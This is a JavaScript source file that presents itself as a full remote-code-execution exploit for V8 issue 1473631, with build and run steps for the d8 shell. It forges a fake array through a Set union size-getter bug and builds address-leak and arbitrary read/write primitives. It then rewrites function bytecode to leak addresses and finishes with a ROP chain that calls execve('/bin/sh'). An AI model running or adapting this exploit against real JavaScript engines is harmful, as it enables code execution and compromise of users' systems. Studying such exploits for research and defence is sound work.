/* 
    brief: Full RCE exploit of issue 1473631 
    repro steps:
        $ git checkout f118dd
        $ gclient sync
        $ ./tools/dev/gm.py x64.release
        $ ./out/x64.release/d8 --harmony exploit.js
*/

// If you compile V8 using a different version, you will need to adjust some offsets. Refer to Google CTF 2023.

var addrOf_LO = new Array(0x30000);

function assert(val) {
    if (!val)
        throw "Assertion Failed";
}

class Helpers {
    constructor() {
        this.buf = new ArrayBuffer(8);
        this.dv = new DataView(this.buf);
        this.u8 = new Uint8Array(this.buf);
        this.u32 = new Uint32Array(this.buf);
        this.u64 = new BigUint64Array(this.buf);
        this.f32 = new Float32Array(this.buf);
        this.f64 = new Float64Array(this.buf);
        this.index = 0;
    }

    pair_i32_to_f64(p1, p2) {
        this.u32[0] = p1;
        this.u32[1] = p2;
        return this.f64[0];
    }

    i64tof64(i) {
        this.u64[0] = i;
        return this.f64[0];
    }

    f64toi64(f) {
        this.f64[0] = f;
        return this.u64[0];
    }

    set_i64(i) {
        this.u64[0] = i;
    }

    set_l(i) {
        this.u32[0] = i;
    }

    set_h(i) {
        this.u32[1] = i;
    }

    get_i64() {
        return this.u64[0];
    }

    ftoil(f) {
        this.f64[0] = f;
        return this.u32[0]
    }

    ftoih(f) {
        this.f64[0] = f;
        return this.u32[1]
    }

    mark_sweep_gc() {
        new ArrayBuffer(0x7fe00000);
    }

    scavenge_gc() {
        for (var i = 0; i < 8; i++) {
            this.add_ref(new ArrayBuffer(0x200000));
        }
        this.add_ref(new ArrayBuffer(8));
    }
    trap() {
        while (1) {
        }
    }
}

const fakeStack2 = new BigUint64Array(0x1000);

var helper = new Helpers();

const firstSet = new Set();
for (let i = 0; i < 0x40; i++)
    firstSet.add(i);

const otherSet = new Set();
var fake_arr_buf = null;
Object.defineProperty(otherSet, 'size', {
    get: function () {
        // 0x0018ed79	0x00000219	0x0004e1d9	0x00000012
        // map        properties  elements    length
        fake_arr_buf = [
            1.139512546882e-311, 2.225073858665283e-308,
            1.1, 1.1, 1.1, 1.1, 1.1, 1.1, 1.1
        ];
        // %DebugPrint(fake_arr_buf);

        for (let i = 1; i <= 0x40; i++) // trigger transition and prevent trigger transition next.
            firstSet.add(-i);

        return fake_arr_buf.length; // use to prevent opt
    },

});

const unionSet = firstSet.union(otherSet);
for (let i = 0; i < 0x2c; i++)
    unionSet.delete(i);

const fake_arr = unionSet.size;
assert(fake_arr.length == 0x80000);
print("[!] fake_arr.length == " + fake_arr.length);


function addrOf(object) {
    fake_arr_buf[1] = helper.i64tof64(0x0006000000202129n);
    addrOf_LO[0] = object;
    return helper.ftoil(fake_arr[0]);
}

function arbRead(where) {
    fake_arr_buf[1] = helper.pair_i32_to_f64(where - 8, 0x60000);
    return helper.f64toi64(fake_arr[0]);
}

function arbWrite(where, what) {
    fake_arr_buf[1] = helper.pair_i32_to_f64(where - 8, 0x60000);
    fake_arr[0] = helper.i64tof64(what);
}

// mov rsp, rbp at the end of Builtins_JSEntryTrampoline. Must be an even
// address, otherwise you will have to use something else.
const d8LeakOffset = 0x1c6bfa4n;
// 0x0000000000cce058: ret; 
const retOffset = 0x0000000000cce058n;
// 0x0000000000f3b56d: pop rdi; ret; 
const popRdiOffset = 0x0000000000d3424dn;
// 0x0000000000d6a9ee: pop rsi; ret; 
const popRsiOffset = 0x0000000000ce7815n;
// 0x0000000000ccf192: pop rdx; ret; 
const popRdxOffset = 0x0000000000ccf192n;
// 0x0000000000d0a728: pop rax; ret; 
const popRaxOffset = 0x0000000000cde188n;
// 0x0000000000cd6546: syscall; 
const syscallOffset = 0x0000000000cd6546n;

// End stuff that needs updating

function hex(x) {
    return `0x${x.toString(16)}`;
}

function BytecodeView(fn) {
    const func_addr = addrOf(fn);
    print(`func_addr at ${hex(func_addr)}`);
    const sfi_addr = arbRead(func_addr + 0x10) & 0x00000000FFFFFFFFn;
    print(`sfi_addr at ${hex(sfi_addr)}`);
    const bytecode_addr = (arbRead(Number(sfi_addr)) >> 32n) - 1n + 0x22n;
    print(`bytecode_addr at ${hex(bytecode_addr)}`);
    let u8_ab = new ArrayBuffer(0x20);
    arbWrite(addrOf(u8_ab) + 0x20, bytecode_addr << 24n);
    return new Uint8Array(u8_ab);
}

function getCageBase() {
    const mv = arbRead(0 + 1 + 3 * 8);
    return (mv & 0xffffffff00000000n);
}

function getLibcHeapPointer() {
    const mv = arbRead(0x40000 + 1 + 2 * 8);
    return mv;
}

function hax1(a, b) {
    return a + b + 1;
}

hax1();

const cageBase = getCageBase();
print(`Cage base at ${hex(cageBase)}`);
const bv = BytecodeView(hax1);
// %DebugPrint(bv);
let i = 0;
function emit(x) {
    bv[i] = x;
    i++;
}

function reset() {
    i = 0;
}

// %DebugPrint(hax1);
// %SystemBreak();

// Frame size 0
//          0x3b710019df98 @    0 : 0b 04             Ldar a1
//          0x3b710019df9a @    2 : 38 03 00          Add a0, [0]
//          0x3b710019df9d @    5 : 44 01 01          AddSmi [1], [1]
//          0x3b710019dfa0 @    8 : aa                Return
// ---->
// Frame size 0
//          0x3b710019df98 @    0 : 0b 04             Ldar a1
//          0x3b710019df9a @    2 : 01 0b 14 00 00 00 Ldar.ExtraWide a17
//          0x3b710019dfa0 @    8 : aa                Return

reset();
// LdarExtraWide frame pointer
emit(1);
emit(0xb);
emit(0x01);
emit(0);
emit(0);
emit(0);
// ret
emit(0xaa);

// Builtins_LdarExtraWideHandler
const d8Leak = hax1();
print(`d8 leak: ${hex(d8Leak << 1)}`);
const upper = (getLibcHeapPointer() & 0xffffffff00000000n);
print(`upper: ${hex(upper)}`);
const d8base = upper + ((BigInt(d8Leak) << 1n) - d8LeakOffset);
print(`d8 at ${hex(d8base)}`);
const fakeStack = new BigUint64Array(8);
const fakeStackBuf = (arbRead(addrOf(fakeStack) + 0x30) >> 32n) + 0x7n;
print(`fake stack data at ${hex(fakeStackBuf)}`);

const fakeBytecode = new Uint8Array(64);
const fakeBytecodeAddress = cageBase + ((arbRead(addrOf(fakeBytecode) + 0x30) >> 32n) + 0x7n);
print(`fake bytecode at ${hex(fakeBytecodeAddress)}`);

const fakeStackBuf2 = cageBase + 0x100000000n
print(`fake stack data 2 at ${hex(fakeStackBuf2)}`);
print(`fake stack TypedArray at ${hex(cageBase + BigInt(addrOf(fakeStack)) - 1n)}`);

// r9
fakeStack[3] = 0n << 9n;
// r12
fakeStack[4] = fakeBytecodeAddress << 8n;
// rcx
const stackOffset = (fakeStackBuf2 - (cageBase + BigInt(fakeStackBuf) + 5n * 8n)) >> 3n;
print(`Stack offset: ${hex(stackOffset)}`);
fakeStack[5] = stackOffset << 8n;
fakeStack[6] = 0n;

fakeBytecode[0] = 0xaa;
fakeBytecode[0x17 + 3] = 0x0;

reset();
// ldar a0
emit(0xb);
emit(3);

// star frame pointer
emit(24);
emit(0);

// ret
emit(0xaa);

const rop_i_init = 3;
let rop_i = rop_i_init;
const rop_shift = 40n;
function rop(x) {
    const val = BigInt(x);
    if (rop_i == rop_i_init) {
        arbWrite(addrOf(fakeStack) + 1 + 0x8, val);
    } else {
        fakeStack2[rop_i] |= val << rop_shift;
        fakeStack2[rop_i + 1] = val >> (64n - rop_shift);
    }
    rop_i++;
}

function rebase(x) {
    return d8base + BigInt(x);
}

const binsh_address = fakeStackBuf2 + 0x800n * 8n;
const argv_address = fakeStackBuf2 + 0x801n * 8n;
// /bin/sh
fakeStack2[0x800] = 0x68732f6e69622fn;
fakeStack2[0x801] = binsh_address;
fakeStack2[0x802] = 0n;

rop(rebase(retOffset))
// execve("/bin/sh")
rop(rebase(popRdiOffset));
rop(binsh_address);
rop(rebase(popRsiOffset));
rop(argv_address);
rop(rebase(popRdxOffset));
rop(0);
rop(rebase(popRaxOffset));
rop(59);
rop(rebase(syscallOffset));
hax1(fakeStack);
